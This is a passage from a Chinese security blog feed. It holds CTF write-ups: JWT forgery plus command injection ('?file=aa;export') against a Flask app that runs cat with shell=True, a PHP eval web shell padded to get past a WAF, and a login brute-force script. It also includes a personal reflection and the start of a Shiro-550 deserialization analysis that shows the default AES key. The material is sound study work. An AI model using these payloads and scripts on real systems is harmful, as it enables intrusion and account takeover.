class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        messages.append(&#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;content&#x27;</span>: content&#125;)</span><br><span class="line">        flash(<span class="string">&#x27;Message posted&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;message&#x27;</span>))  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>, messages=messages)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: generate_password_hash(password), <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">        flash(<span class="string">&#x27;User registered successfully&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> check_password_hash(users[username][<span class="string">&#x27;password&#x27;</span>], password):</span><br><span class="line">            access_token = jwt.encode(&#123;</span><br><span class="line">                <span class="string">&#x27;sub&#x27;</span>: username,</span><br><span class="line">                <span class="string">&#x27;role&#x27;</span>: users[username][<span class="string">&#x27;role&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(minutes=<span class="number">30</span>)</span><br><span class="line">            &#125;, app.config[<span class="string">&#x27;JWT_SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">            response = make_response(render_template(<span class="string">&#x27;page.html&#x27;</span>))</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;jwt&#x27;</span>, access_token, httponly=<span class="literal">True</span>, secure=<span class="literal">True</span>, samesite=<span class="string">&#x27;Lax&#x27;</span>,path=<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            <span class="comment"># response.set_cookie(&#x27;jwt&#x27;, access_token, httponly=True, secure=False, samesite=&#x27;None&#x27;,path=&#x27;/&#x27;)</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid username or password&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">    resp.set_cookie(<span class="string">&#x27;jwt&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">    flash(<span class="string">&#x27;You have been logged out&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    jwt_token = request.cookies.get(<span class="string">&#x27;jwt&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> jwt_token:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(jwt_token, app.config[<span class="string">&#x27;JWT_SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            current_user = payload[<span class="string">&#x27;sub&#x27;</span>]</span><br><span class="line">            role = payload[<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Token has expired&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid token&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid or expired token&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> role != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> current_user <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>, <span class="string">&#x27;Access denied&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        file_path = os.path.join(DOCUMENT_DIR, file)</span><br><span class="line">        file_path = os.path.normpath(file_path)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_path.startswith(DOCUMENT_DIR):</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">400</span>, <span class="string">&#x27;Invalid file name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = subprocess.check_output(<span class="string">f&#x27;cat <span class="subst">&#123;file_path&#125;</span>&#x27;</span>, shell=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">            content = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            content = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;page.html&#x27;</span>, content=content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">403</span>, <span class="string">&#x27;Access denied&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/categories&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">categories</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;categories.html&#x27;</span>, categories=[<span class="string">&#x27;Web&#x27;</span>, <span class="string">&#x27;Pwn&#x27;</span>, <span class="string">&#x27;Misc&#x27;</span>, <span class="string">&#x27;Re&#x27;</span>, <span class="string">&#x27;Crypto&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5050</span>)</span><br></pre></td></tr></table></figure>
<p>主要执行命令的位置，这里我们可以控制文件路径，只需要绕过前面的身份验证即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content = subprocess.check_output(<span class="string">f&#x27;cat <span class="subst">&#123;file_path&#125;</span>&#x27;</span>, shell=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>首先需要先去login一个身份，进行登入时就会有一个set-cookie</p>
<p><img src="https://luokuang1.github.io/images/build7.png" width="95%" height="80%"></p>
<p>最后需要通过伪造jwt来实现身份绕过</p>
<p>app.secret_key = ‘BuildCTF’直接通过jwt.io来进行绕过即可</p>
<p>最后带着jwt来访问page就可以提交file,这里执行命令时对空格进行了特殊处理,flag在环境变量里面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?file=aa;export</span><br></pre></td></tr></table></figure>
<h3 id="ez-waf"><a href="#ez-waf" class="headerlink" title="ez_waf"></a>ez_waf</h3><p>通过脏数据来绕过waf，这里的文件上传没有过滤文件名，所以可以直接提交php文件，但是过滤了太多的符号</p>
<p>&lt;=等等，所以根本无法构造正常的木马</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;qwe.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&#x27;1&#x27;</span> * <span class="number">100000</span>)</span><br><span class="line">    file.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    file.write(<span class="string">&quot;&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>直接通过蚁剑连接即可</p>
<h3 id="tflock"><a href="#tflock" class="headerlink" title="tflock"></a>tflock</h3><p>这个题当时没有写出来，看了看题解，也是笑了，原来是环境的问题</p>
<p>首先在robots.txt下获取提示，在/passwordList里面有爆破的密码</p>
<p>首先可以通过该密码进行登入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctfer:<span class="number">123456</span></span><br><span class="line">admin:x</span><br></pre></td></tr></table></figure>
<p>这里主要是要爆破出admin登入的密码，但是这里需要注意如果账户已经锁定，爆破的时候还是锁定的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://27.25.151.80:45304/login.php&#x27;</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">ctfer = &#123;</span><br><span class="line"> <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;ctfer&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">aaa = requests.post(url, data=ctfer)</span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>):</span><br><span class="line">    admin = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: password.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">     &#125;</span><br><span class="line">    aaa = requests.post(url, data=admin)</span><br><span class="line">    <span class="built_in">print</span>(aaa.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;true&quot;</span> <span class="keyword">in</span> aaa.text:</span><br><span class="line">        <span class="built_in">print</span>(admin)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        aaa = requests.post(url, data=ctfer)</span><br></pre></td></tr></table></figure>
<p>最后提交即可得flag</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>最近的感慨</title>
    <url>/2025/02/14/%E6%9C%80%E8%BF%91%E7%9A%84%E6%84%9F%E6%85%A8/</url>
    <content><![CDATA[<p>​    回顾2024年下来，自己还是很失败的，好像一直在学，但又没有学到什么，对于自己也付出看不到结果，看着比赛群中，一个个妖怪的诞生，自己又是那么的暗淡无光，渐渐的开始否认自己，迷失了方向，可能自己真的就没有努力过吧。</p>
<p>​    所有的一切都不是一蹴而就，真正的学习过程需要通过时间来沉淀，失败了就失败了，大不了就从头来过………</p>
<p>​    在学习了一段时间的java安全，但也慢慢的明确了未来的方向，起初对我而言，CTF就是一切，但慢慢的发现，安全并不局限于此还有更多的东西，等待我去学习</p>
<p>​    所以我选择了继续沉淀，沉下心来慢慢学习，希望有一天自己也能发光发亮</p>
]]></content>
  </entry>
  <entry>
    <title>Shiro反序列化</title>
    <url>/2024/11/14/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h3 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>漏洞形成原因，在shiro550的版本里面存在通过cookie值来存储信息的方式，而cookie的形成的原因是通过特殊的加密手段，加密的信息为一个字节流，在获取cookie中信息时会进行一次反序列化</p>
<p>环境布置</p>
<p>首先下载好maven项目</p>
<p><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
<p>将下载好的文件目录下的samples下的web以mvn项目的方式导入</p>
<p>再添加解析jsp的maven依赖即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>再配置tomcat环境即可，配置完成后运行即可</p>
<p><img src="https://luokuang1.github.io/images/shiro1.png" width="95%" height="80%"></p>
<h4 id="漏洞分析-amp-利用"><a href="#漏洞分析-amp-利用" class="headerlink" title="漏洞分析&amp;利用"></a>漏洞分析&amp;利用</h4><p>在shiro中存在一个对cookie的处理机制，当我们点击remember me是就会在响应的报文中生成一个rememberme的数据，而这里就是触发反序列化的关键，由于rememberme的字段过长可能存放某种信息，初步判断是通过某种加密的字符流，所以可能会存在反序列化点</p>
<p><img src="https://luokuang1.github.io/images/shiro2.png" width="95%" height="80%"></p>
<p>下面就可以去找找哪里是创建cookie的方法，这个是shiro包下的并且与cookie有关，直接搜索就可以大致的看到有一个类叫CookieRememberMeManager，它比较符合</p>
<p><img src="https://luokuang1.github.io/images/shiro3.png" width="95%" height="80%"></p>
<p>这里主要看它的两个方法，一个是用来生成加密的信息，一个是用来解密信息</p>
<h5 id="加密信息"><a href="#加密信息" class="headerlink" title="加密信息"></a>加密信息</h5><p>首先看CookieRememberMeManager的rememberSerializedIdentity，它生成了一个cookie，这里是最后通过base64编码了一个cookie值，我们可以去查看哪里调用了rememberSerializedIdentity，看看是否还有加密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="type">byte</span>[] serialized)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//base 64 encode it and store as a cookie:</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.encodeToString(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">template</span> <span class="operator">=</span> getCookie(); <span class="comment">//the class attribute is really a template for the outgoing cookies</span></span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(template);</span><br><span class="line">    cookie.setValue(base64);</span><br><span class="line">    cookie.saveTo(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shiro4.png" width="95%" height="80%"></p>
<p>来到AbstractRememberMeManager的rememberIdentity，继续跟进看看bytes属性是如何形成的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到convertPrincipalsToBytes方法，这里是先序列化了字节流，通过一个if语句对其进行加密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进encrypt函数再进入cipherService.encrypt()里面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="type">byte</span>[] value = serialized;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shiro5.png" width="95%" height="80%"></p>
<p>这里是一个接口，应该是通过encrytionKey对其进行加密，而这里的key是通过getEncryptionCipherKey方法获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getEncryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里继续查看哪里对encryptionCipherKey进行了赋值操作，找到setEncryptionCipherKey函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEncryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] encryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.encryptionCipherKey = encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进行找到setCipherKey调用了setEncryptionCipherKey方法，这里继续</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">    <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终到了其构造方法里面对其进行赋值 DEFAULT_CIPHER_KEY_BYTES是一个常量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>这里总结一下，对于shiro的remamberme的创建是通过固定的key来进行aes加密序列化的字节流，对于解密应该就是相反的操作，解密+反序列化</p>
<h5 id="解密信息"><a href="#解密信息" class="headerlink" title="解密信息"></a>解密信息</h5><p>还是看CookieRememberMeManager类</p>
<p>这里有一个getRememberedSerializedIdentity方法里面用来接收cookie，并且进行base64解码操作，这里我们就可以进行看在解码后会进行什么操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">    <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">    <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">    <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">    <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还是一样需要查看调用的逻辑，所以看哪里调用了getRememberedSerializedIdentity方法，来到AbstractRememberMeManager的getRememberedPrincipals方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就可以看到在对字节流进行base64解码后它进行了一个if操作这里跟进去看看里面的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在convertBytesToPrincipals一看就比较的清楚了，这里先对其进行解码操作后面再进行反序列操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到它这里的getDecryptionCipherKey()和上面的key的获取是相同的，主要看后面的deserialize方法的操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedIdentity)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shiro6.png" width="95%" height="80%"></p>
